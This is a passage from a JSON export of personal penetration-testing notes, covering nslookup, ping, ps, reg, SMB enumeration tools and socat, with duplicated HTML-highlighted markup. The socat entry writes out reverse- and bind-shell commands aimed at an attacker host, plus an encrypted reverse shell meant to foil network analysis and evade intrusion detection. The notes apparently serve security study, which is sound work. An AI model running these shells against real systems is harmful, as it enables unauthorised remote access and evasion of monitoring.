style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;LISTENING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; findstr &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/nslookup":{"slug":"spells/nslookup","filePath":"spells/nslookup.md","title":"nslookup","links":["spells/dig"],"tags":["Application/nslookup","OS/Windows","OS/Linux","Application/dig"],"content":"The nslookup command exists on both Windows and *NIX, but is particularly important on Windows (where dig is not available).\n# nslookup command syntax; only $DOMAIN is required\n#\nnslookup -type=$QUERY_TYPE $DOMAIN $NAME_SERVER\n \n# Examples\n#\nnslookup -type=A  microsoft.com 8.8.8.8\nnslookup          tryhackme.com 1.1.1.1\nnslookup -type=MX google.com\nOn Windows, the nslookup.exe binary also provides a nice shell if run without any arguments. From here, a server to query can be specified (server $IP_ADDRESS), and then ls -d $DOMAIN will provide all records related to the specified $DOMAIN (including, it would seem, subdomain information!).","richContent":"&lt;p&gt;The nslookup command exists on both Windows and *NIX, but is particularly important on Windows (where &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/dig&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/dig&quot;&gt;dig&lt;/a&gt; is not available).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# nslookup command syntax; only $DOMAIN is required&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;nslookup &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;QUERY_TYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME_SERVER&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Examples&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;nslookup &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;A  &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;microsoft.com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 8.8&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;8.8&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;nslookup          &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;tryhackme.com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1.1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;nslookup &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MX &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;google.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;On Windows, the nslookup.exe binary also provides a nice shell if run without any arguments. From here, a server to query can be specified (&lt;code&gt;server $IP_ADDRESS&lt;/code&gt;), and then &lt;code&gt;ls -d $DOMAIN&lt;/code&gt; will provide &lt;em&gt;all&lt;/em&gt; records related to the specified &lt;code&gt;$DOMAIN&lt;/code&gt; (including, it would seem, subdomain information!).&lt;/p&gt;"},"spells/ping":{"slug":"spells/ping","filePath":"spells/ping.md","title":"ping","links":[],"tags":["Application/ping","OS/Windows","OS/Linux"],"content":"The ping command is found on both *NIX and Windows systems, though the two versions have slightly different options.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n*NIXWindowsDescription-c-nSpecify number of packets to send","richContent":"&lt;p&gt;The ping command is found on both *NIX and Windows systems, though the two versions have slightly different options.&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;*NIX&lt;/th&gt;&lt;th align=&quot;right&quot;&gt;Windows&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Description&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-c&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Specify number of packets to send&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;"},"spells/ps":{"slug":"spells/ps","filePath":"spells/ps.md","title":"ps","links":[],"tags":["Application/ps","OS/Linux","OS/AIX","OS/macOS"],"content":"Instead of u, j can be used with ps to get a slightly different column output format. This is mostly useful for finding out numeric user IDs and parent process IDs.","richContent":"&lt;p&gt;Instead of &lt;code&gt;u&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt; can be used with ps to get a slightly different column output format. This is mostly useful for finding out numeric user IDs and &lt;em&gt;parent&lt;/em&gt; process IDs.&lt;/p&gt;"},"spells/reg":{"slug":"spells/reg","filePath":"spells/reg.md","title":"reg","links":[],"tags":["OS/Windows/Registry","Application/reg"],"content":"The reg binary is used to interact with the Windows registry from the command line.\nreg query $REGISTRY_PATH\nRegistry paths will typically start with HKLM (HKey Local Machine), HKCU (HKey Current User), etc.","richContent":"&lt;p&gt;The reg binary is used to interact with the Windows registry from the command line.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg query &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;REGISTRY_PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Registry paths will typically start with HKLM (HKey Local Machine), HKCU (HKey Current User), etc.&lt;/p&gt;"},"spells/smbclient":{"slug":"spells/smbclient","filePath":"spells/smbclient.md","title":"smbclient","links":["spells/FTP","spells/enum4linux"],"tags":["Application/smbclient","Protocol/SMB","Protocol/FTP","Application/enum4linux","AttackCycle/Reconnaissance","OS/Linux"],"content":"smbclient //$IP/$SHARE -U $USER -p $PORT\n\n-I — IP address to connect to\n-U — username to use for the connection\n-P — password to use for the connection\n-N — attempt to connect without a password\n-W — domain (or workgroup) to use for the connection\n-p — connect to a non-standard port\n-c — attempt to execute the supplied command (!!!) on the server (if the user you’re connecting as has permission to do so)\n\nThe -p directive is only necessary if working over a non-standard port (e.g., not 445).\nIf -U is not included, smbclient will use your current (local) username, so probably best to fill something else in. If a password needs to be sent, specify the user as ${USER}%${PASSWORD}.\nThe interface is reminiscent of old-school FTP clients.\nReconnaissance\nSamba services can be enumerated by smbclient using:\nsmbclient -L $SERVER_NAME -I $IP_ADDRESS\nHere $SERVER_NAME is the machine’s NetBIOS domain name, which can be found with enum4linux.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;smbclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; //&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$SHARE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-I&lt;/code&gt; — IP address to connect to&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-U&lt;/code&gt; — username to use for the connection&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-P&lt;/code&gt; — password to use for the connection&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-N&lt;/code&gt; — attempt to connect without a password&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-W&lt;/code&gt; — domain (or workgroup) to use for the connection&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — connect to a non-standard port&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; — attempt to execute the supplied command (!!!) on the server (if the user you’re connecting as has permission to do so)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The &lt;code&gt;-p&lt;/code&gt; directive is only necessary if working over a non-standard port (e.g., &lt;em&gt;not&lt;/em&gt; 445).&lt;/p&gt;\n&lt;p&gt;If &lt;code&gt;-U&lt;/code&gt; is not included, smbclient will use your current (local) username, so probably best to fill something else in. If a password needs to be sent, specify the user as &lt;code&gt;${USER}%${PASSWORD}&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;The interface is reminiscent of old-school &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; clients.&lt;/p&gt;\n&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Samba services can be enumerated by smbclient using:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;smbclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVER_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -I&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$SERVER_NAME&lt;/code&gt; is the machine’s NetBIOS domain name, which can be found with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/enum4linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt;.&lt;/p&gt;"},"spells/smbget":{"slug":"spells/smbget","filePath":"spells/smbget.md","title":"smbget","links":["spells/smbclient","spells/Uniform-resource-locators"],"tags":["Application/smbget","Protocol/SMB","Application/smbclient","Standard/URI"],"content":"smbget smb://$IP/$SHARE/$FILE -U $USER\nDownload $FILE from $SHARE at $IP.\nNote that the semantics are annoyingly slightly different from smbclient — no port specification, and the smb: protocol portion of the URI must be included.\nUse -R (and omit $FILE) to recursively download an entire directory.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;smbget&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; smb://&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$SHARE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Download &lt;code&gt;$FILE&lt;/code&gt; from &lt;code&gt;$SHARE&lt;/code&gt; at &lt;code&gt;$IP&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Note that the semantics are annoyingly slightly different from &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/smbclient&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/smbclient&quot;&gt;smbclient&lt;/a&gt; — no port specification, and the &lt;code&gt;smb:&lt;/code&gt; protocol portion of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt; must be included.&lt;/p&gt;\n&lt;p&gt;Use &lt;code&gt;-R&lt;/code&gt; (and omit &lt;code&gt;$FILE&lt;/code&gt;) to recursively download an entire directory.&lt;/p&gt;"},"spells/smbmap":{"slug":"spells/smbmap","filePath":"spells/smbmap.md","title":"smbmap","links":[],"tags":["Application/smbmap","Protocol/SMB"],"content":"\n-h — IP address or host to enumerate\n-u — username to use during enumeration (attempts to use the NULL session if not supplied)\n-p — password or NTLM hash to use during enumeration\n-d — domain (or workgroup) to use during enumeration\n-s — share to enumerate (defaults to C$ if not supplied)\n-x — attempt to execute the supplied command (!!!) on the server (if the user you’re connecting as has permission to do so)\n--download/--upload — download or upload a file to specified share\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; — IP address or host to enumerate&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; — username to use during enumeration (attempts to use the NULL session if not supplied)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — password or NTLM hash to use during enumeration&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; — domain (or workgroup) to use during enumeration&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-s&lt;/code&gt; — share to enumerate (defaults to &lt;code&gt;C$&lt;/code&gt; if not supplied)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; — attempt to execute the supplied command (!!!) on the server (if the user you’re connecting as has permission to do so)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--download&lt;/code&gt;/&lt;code&gt;--upload&lt;/code&gt; — download or upload a file to specified share&lt;/li&gt;\n&lt;/ul&gt;"},"spells/socat":{"slug":"spells/socat","filePath":"spells/socat.md","title":"socat","links":["spells/netcat","spells/Automatically-stabilize-a-reverse-shell-with-socat"],"tags":["Application/socat","Application/netcat","Application/PowerShell","AttackCycle/LateralMovement","AttackCycle/AntiForensics"],"content":"socat: The anything-to-anything connector!\nsocat vs. netcat\nsocat ↔ netcat command equivalencies:\n# Reverse shell (attacker)\n#\nnc -lnp $LISTENER_PORT\nsocat TCP-LISTEN:$LISTENER_PORT -\n \n# Reverse shell (target)\n#\nnc $ATTACKER_IP $LISTENER_PORT -e /bin/bash\nsocat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:&quot;/bin/bash -li&quot;\n \n# Bind shell (attacker)\n#\nnc $TARGET_IP $LISTENER_PORT\nsocat TCP:$TARGET_IP:$LISTENER_PORT\n \n# Bind shell (target)\n#\nnc -lnp $LISTENER_PORT -e /bin/bash\nsocat TCP-LISTEN:$LISTENER_PORT EXEC:&quot;/bin/bash -li&quot;\nsocat gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use powershell.exe,pipes in order to force PowerShell to use UNIX-style STDIN/STDOUT.\nEncrypted shells\nsocat can make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.\n# Generate a self-signed certificate.\n#\nopenssl req --newkey rsa:2048 -nodes \\\n            -keyout shell.key -x509 -days 362 \\\n            -out shell.crt\n \n# Create a PEM file combining the certificate and key.\n#\ncat shell.key shell.crt &gt; shell.pem\n \n# Start a listener.\n#\nsocat OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -\n \n# Start the reverse shell on the target.\n#\nsocat OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 EXEC:&quot;/bin/bash -li&quot;\nThe verify=0 directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been authenticated, but it is secure in the sense that it’s encrypted.\nShell “stabilization”\nTransclude of Automatically-stabilize-a-reverse-shell-with-socat","richContent":"&lt;p&gt;socat: The anything-to-anything connector!&lt;/p&gt;\n&lt;h2 id=&quot;socat-vs-netcat&quot;&gt;socat vs. netcat&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#socat-vs-netcat&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;socat ↔ &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; command equivalencies:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Reverse shell (attacker)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lnp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LISTENER_PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP-LISTEN:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Reverse shell (target)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /bin/bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; EXEC:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Bind shell (attacker)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LISTENER_PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span 